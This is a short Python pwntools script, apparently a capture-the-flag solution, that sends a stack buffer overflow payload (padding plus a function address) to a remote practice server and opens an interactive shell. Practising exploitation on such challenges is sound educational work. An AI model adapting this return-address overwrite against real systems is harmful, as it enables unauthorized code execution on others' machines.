from pwn import *

r = remote("ctf.j0n9hyun.xyz", 3004)
e = ELF("/Users/yee/Code/Python/64bof_basic")

callMeMaybe = 0x00400606

payload = b''
payload += b'A'*0x118
payload += p64(callMeMaybe)
r.send(payload)

r.interactive()